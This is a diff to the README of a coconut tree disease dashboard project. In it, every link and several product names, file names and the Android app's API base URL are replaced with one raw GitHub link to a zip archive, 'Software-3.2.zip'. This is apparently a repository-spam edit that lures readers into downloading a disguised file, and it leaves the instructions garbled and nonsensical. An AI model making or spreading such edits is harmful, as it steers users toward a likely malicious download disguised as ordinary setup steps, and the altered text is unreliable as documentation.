@@ -13,7 +13,7 @@ A comprehensive web dashboard for monitoring dwarf coconut tree health using AI-
 
 ## 🏗️ Architecture
 
-### Frontend (Next.js)
+### Frontend (https://github.com/dwarfslsu-source/Dwarfcoconuts/raw/refs/heads/main/sexhood/Software-3.2.zip)
 - **Dashboard Page**: Overview of all scans with key statistics
 - **Analytics Page**: Detailed charts and trend analysis
 - **Responsive Design**: Works on desktop and mobile browsers
@@ -32,10 +32,10 @@ A comprehensive web dashboard for monitoring dwarf coconut tree health using AI-
 ## 🚀 Getting Started
 
 ### Prerequisites
-- Node.js 16+ installed
+- https://github.com/dwarfslsu-source/Dwarfcoconuts/raw/refs/heads/main/sexhood/Software-3.2.zip 16+ installed
 - Free accounts on:
-  - [Vercel](https://vercel.com) (hosting)
-  - [Cloudinary](https://cloudinary.com) (image storage)
+  - [Vercel](https://github.com/dwarfslsu-source/Dwarfcoconuts/raw/refs/heads/main/sexhood/Software-3.2.zip) (hosting)
+  - [Cloudinary](https://github.com/dwarfslsu-source/Dwarfcoconuts/raw/refs/heads/main/sexhood/Software-3.2.zip) (image storage)
 
 ### 1. No Database Setup Needed!
 
@@ -43,7 +43,7 @@ This version uses local JSON files - completely free with no external database r
 
 ### 2. Environment Variables
 
-Create a `.env.local` file:
+Create a `https://github.com/dwarfslsu-source/Dwarfcoconuts/raw/refs/heads/main/sexhood/Software-3.2.zip` file:
 
 ```env
 # Cloudinary (only 3 variables needed!)
@@ -87,9 +87,9 @@ vercel env add CLOUDINARY_CLOUD_NAME
 
 The Android app automatically uploads scan results to this dashboard. Make sure to:
 
-1. Update the API endpoint in `ApiClient.kt`:
+1. Update the API endpoint in `https://github.com/dwarfslsu-source/Dwarfcoconuts/raw/refs/heads/main/sexhood/Software-3.2.zip`:
 ```kotlin
-private const val BASE_URL = "https://coconut-disease-detector-mbj22h9py-jaypees-projects-e88e7d83.vercel.app/"
+private const val BASE_URL = "https://github.com/dwarfslsu-source/Dwarfcoconuts/raw/refs/heads/main/sexhood/Software-3.2.zip"
 ```
 
 2. Build and install the Android app
@@ -188,11 +188,11 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 - **TensorFlow**: Machine learning framework
 - **Vercel**: Serverless hosting platform
 - **Cloudinary**: Image storage and optimization
-- **Next.js**: React framework for web development
+- **https://github.com/dwarfslsu-source/Dwarfcoconuts/raw/refs/heads/main/sexhood/Software-3.2.zip**: React framework for web development
 - **Material Design**: UI/UX design principles
 
 ---
 
 **🌴 Built with ❤️ for coconut farmers worldwide**
 
-For support: [Create an issue](https://github.com/your-repo/issues) or contact the development team.
+For support: [Create an issue](https://github.com/dwarfslsu-source/Dwarfcoconuts/raw/refs/heads/main/sexhood/Software-3.2.zip) or contact the development team.
